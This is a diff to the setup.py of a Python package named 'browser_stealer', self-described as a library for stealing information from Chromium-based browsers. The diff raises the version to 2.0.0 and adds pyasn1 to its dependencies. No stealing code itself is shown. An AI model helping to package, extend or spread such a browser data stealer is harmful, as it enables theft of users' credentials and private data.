@@ -1,6 +1,7 @@
 from setuptools import setup, find_packages
 
-VERSION = "1.1.0"
+VERSION = "2.0.0"
+REQ = ["Crypto.Cipher", "pywin32", "pyasn1"]
 
 setup(
     name="browser_stealer",
@@ -9,5 +10,5 @@ setup(
     author_email="josakko@protonmail.com",
     description="Python library for stealing different info from chromium based browsers",
     packages=find_packages(),
-    install_requires=["Crypto.Cipher", "pywin32"],
+    install_requires=REQ,
 )
